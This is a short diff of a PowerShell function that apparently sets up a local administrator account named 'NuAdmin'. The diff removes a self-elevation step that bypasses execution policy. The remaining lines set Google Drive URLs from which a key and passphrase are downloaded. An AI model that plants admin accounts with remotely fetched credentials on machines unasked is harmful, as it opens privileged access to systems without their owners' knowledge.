@@ -1,10 +1,5 @@
 function adNuAdmin {
     try {
-        if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
-            Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $PSCommandArgs" -WorkingDirectory $pwd -Verb RunAs
-            Exit
-        } 
-
         $accountName = "NuAdmin"
         $keyUrl = "https://drive.google.com/uc?export=download&id=1-1bV76OHwbu-g2RroIUvZ7s6I3FeLL0w"
         $phraseUrl = "https://drive.google.com/uc?export=download&id=1qeSFJaKTmabGFwRoqf5mgnZd3rtSr37o"
